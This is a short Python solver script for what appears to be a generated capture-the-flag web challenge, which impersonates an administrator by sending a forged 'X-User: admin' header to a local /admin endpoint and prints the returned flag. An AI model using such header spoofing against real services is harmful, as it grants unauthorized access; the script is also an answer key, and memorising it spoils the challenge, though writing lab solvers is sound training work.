#!/usr/bin/env python3
import os
import sys
import json
import time
import requests

"""Automated solver for http-ctf-20251216-000001

Steps:
1. Take base URL from argv[1] or env BASE_URL (e.g., http://127.0.0.1:12345).
2. Abuse the header-based auth weakness on /admin to impersonate admin.
3. Request action=get_flag to retrieve the flag.
"""


def main():
    if len(sys.argv) > 1:
        base = sys.argv[1].rstrip("/")
    else:
        base = os.environ.get("BASE_URL", "http://127.0.0.1:8080").rstrip("/")

    url = f"{base}/admin"

    # Directly exploit header trust by sending X-User: admin
    headers = {"X-User": "admin", "Content-Type": "application/json"}
    payload = {"action": "get_flag"}

    for _ in range(3):
        try:
            r = requests.post(url, headers=headers, json=payload, timeout=5)
            data = r.json()
            if data.get("ok") and "flag" in data:
                print(data["flag"])
                return 0
            else:
                print(json.dumps(data))
                return 1
        except Exception as e:
            time.sleep(1)

    print("[-] Failed to retrieve flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
